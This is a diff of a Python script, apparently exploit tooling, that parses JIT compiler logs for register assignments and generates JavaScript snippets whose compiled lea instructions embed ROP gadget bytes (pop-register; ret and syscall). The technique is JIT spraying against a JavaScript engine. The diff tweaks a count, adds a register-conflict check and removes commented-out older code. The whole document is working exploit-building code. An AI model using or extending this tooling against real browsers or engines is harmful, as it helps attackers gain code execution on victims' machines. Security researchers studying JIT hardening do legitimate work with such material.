@@ -7,7 +7,7 @@ import pathlib
 gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
 rs_set = {'rdx', 'r11', 'rsi', 'rbx', 'rdi', 'r8', 'rcx'}
 exec_path = ''
-count = 12
+count = 15
 
 def get_registers(log:str):
     f = open(log, 'r')
@@ -25,8 +25,11 @@ def get_registers(log:str):
             print(dd[2], ' '.join(dd[3:]))
         for num in nums:
             if line.find(num) != -1 and line[line.find(num) - 1] == ',':
-                mm[line[line.find('r') : line.find(num) - 1]] = num[2:]
-                break
+                if line[line.find('r') : line.find(num) - 1] in mm.keys():
+                    print('conflict at ' + line[line.find('r') : line.find(num) - 1])
+                else:
+                    mm[line[line.find('r') : line.find(num) - 1]] = num[2:]
+                    break
     return mm
 
 def excute_js(js:str, filename:str)->bool:
@@ -129,27 +132,22 @@ def generate_js(filename:str):
 
     base = 110
     # 428d945ac3000000 ;leal rdx,[rdx+r11*2+0xc3]
-    # jsc5ac3 = '\tvar s = t' + str(int(rs_map['rdx']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n'
     jsc5ac3 = gen_jsc('rdx', 'r11')
     if not excute_js(header + jsc5ac3 + tail, '5ac3'):
         print('generate 5ac3 failed')
     # 8d8c5ec3000000 ;leal rcx,[rsi+rbx*2+0xc3]
-    # jsc5ec3 = '\tvar s = t' + str(int(rs_map['rsi']) - base) + ' + t' + str(int(rs_map['rbx']) - base) + ' * 2 + 0xc3;\n'
     jsc5ec3 = gen_jsc('rsi', 'rbx')
     if not excute_js(header + jsc5ec3 + tail, '5ec3'):
         print('generate 5ec3 failed')
     # 428d8c5fc3000000 ;leal rcx,[rdi+r11*2+0xc3]
-    # jsc5fc3 = '\tvar s = t' + str(int(rs_map['rdi']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n'
     jsc5fc3 = gen_jsc('rdi', 'r11')
     if not excute_js(header + jsc5fc3 + tail, '5fc3'):
         print('generate 5fc3 failed')
     # 438d8c58c3000000 ;leal rcx,[r8+r11*2+0xc3]
-    # jsc58c3 = '\tvar s = t' + str(int(rs_map['r8']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n' 
     jsc58c3 = gen_jsc('r8', 'r11')
     if not excute_js(header + jsc58c3 + tail, '58c3'):
         print('generate 58c3 failed')
     # 8d4c0f05   	;leal rcx,[rdi+rcx*1+0x5]
-    # jsc0f05 = '\tvar s = t' + str(int(rs_map['rcx']) - base) + ' + t' + str(int(rs_map['rdi']) - base) + ' + 0x5;\n'
     jsc0f05 = gen_syscall('rcx', 'rdi')
     if not excute_js(header + jsc0f05 + tail, '0f05'):
         print('generate 0f05 failed')
